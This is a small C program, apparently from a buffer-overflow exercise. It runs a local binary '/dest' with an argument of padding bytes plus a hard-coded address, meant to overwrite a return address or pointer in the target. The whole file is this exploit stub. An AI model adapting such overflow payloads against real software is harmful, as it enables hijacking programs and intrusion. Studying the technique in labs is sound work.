#include "stdio.h"
#include "errno.h"
#include "string.h"

#define NULL 0  /*without this macro gcc says it is not declared*/

int main()
{
	if(execl("/dest", "./dest", "aaaaaaaaaaaaaaaa\xe8\xfb\x0f\x01\x29\x10\x00\x00", NULL) < 0) {
		printf("\nexecl failed\n");
	}

	return 0;
}
